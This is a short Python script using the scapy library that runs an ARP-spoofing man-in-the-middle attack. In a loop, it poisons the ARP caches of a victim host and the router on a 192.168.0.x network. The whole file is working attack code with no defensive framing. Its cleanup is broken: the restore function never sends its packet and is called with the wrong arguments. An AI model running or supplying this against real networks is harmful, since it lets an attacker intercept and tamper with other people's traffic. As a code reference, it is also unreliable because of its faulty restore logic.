import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc
    
           

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst =target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# will spoof while program is running
sent_packets_count = 0


def restore(dst_ip,src_ip):
    destination_mac = get_mac(dst_ip)
    source_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=destination_mac, psrc=src_ip, hwsrc=source_mac)

try:
    while True:
# Call spoof function with targetip of victim
        spoof("192.168.0.80","192.168.0.1")
# Now spoof router
        spoof("192.168.0.1","192.168.0.80")
        sent_packets_count = sent_packets_count + 2
        print("\r [+] Packets Sent" + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt: 
    print("[+] Detected CTRL C ....... Quitting")
    # Reset ARP tables
    restore("192.168.0.80,192.168.0.1")




get_mac("192.168.0.1")